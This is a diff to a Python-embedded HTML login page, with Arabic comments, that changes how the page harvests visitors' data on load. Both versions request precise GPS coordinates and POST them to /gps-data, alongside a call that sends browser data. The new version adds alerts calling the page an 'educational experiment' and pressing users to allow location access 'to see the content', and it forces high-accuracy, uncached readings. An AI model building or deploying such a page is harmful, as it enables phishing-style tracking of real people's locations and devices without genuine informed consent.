@@ -146,24 +146,50 @@ login_page_html = '''
         </div>
     </div>
     <script>
-    // طلب الموقع الدقيق (GPS) عند تحميل الصفحة
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                fetch('/gps-data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ lat, lng, accuracy })
-                }).catch(err => console.log('خطأ في إرسال GPS:', err));
-            },
-            function(error) {
-                console.log('لم يتم مشاركة الموقع:', error.message);
-            }
-        );
+    // دالة لطلب الموقع وتوضيح الإذن للمستخدم
+    function requestLocation() {
+        if (navigator.geolocation) {
+            // عرض رسالة للمستخدم أنه سيتم طلب الإذن
+            alert('سيتم طلب الإذن لمشاركة موقعك مع هذه التجربة التعليمية. يرجى الموافقة لتتمكن من رؤية المحتوى.');
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // في حال الموافقة: إرسال الموقع
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    fetch('/gps-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ lat, lng, accuracy })
+                    }).catch(err => console.log('خطأ في إرسال GPS:', err));
+                    
+                    // إعلام المستخدم بأن الموقع تم مشاركته
+                    alert('✅ تم مشاركة موقعك بنجاح!');
+                },
+                function(error) {
+                    // في حال الرفض أو الخطأ
+                    let errorMsg = '❌ لم تتم مشاركة الموقع. ';
+                    if (error.code === 1) {
+                        errorMsg += 'لقد رفضت الإذن. يمكنك تغيير ذلك في إعدادات المتصفح.';
+                    } else if (error.code === 2) {
+                        errorMsg += 'الموقع غير متاح حالياً. حاول مرة أخرى.';
+                    } else if (error.code === 3) {
+                        errorMsg += 'انتهى وقت طلب الموقع. حاول مرة أخرى.';
+                    }
+                    alert(errorMsg);
+                    console.log('خطأ في الموقع:', error.message);
+                },
+                {
+                    enableHighAccuracy: true,  // طلب موقع دقيق
+                    timeout: 10000,            // مهلة 10 ثوانٍ
+                    maximumAge: 0              // لا تستخدم موقعاً مخزناً مؤقتاً
+                }
+            );
+        } else {
+            alert('❌ متصفحك لا يدعم خاصية تحديد الموقع.');
+        }
     }
 
     // جمع بيانات المتصفح الإضافية
@@ -187,8 +213,12 @@ login_page_html = '''
         }).catch(err => console.log('خطأ في إرسال بيانات المتصفح:', err));
     }
 
-    // استدعاء الدالة عند تحميل الصفحة
-    collectBrowserData();
+    // استدعاء الدوال عند تحميل الصفحة
+    window.onload = function() {
+        // تأخير بسيط لضمان تحميل الصفحة بالكامل
+        setTimeout(requestLocation, 1000);
+        collectBrowserData();
+    };
     </script>
 </body>
 </html>
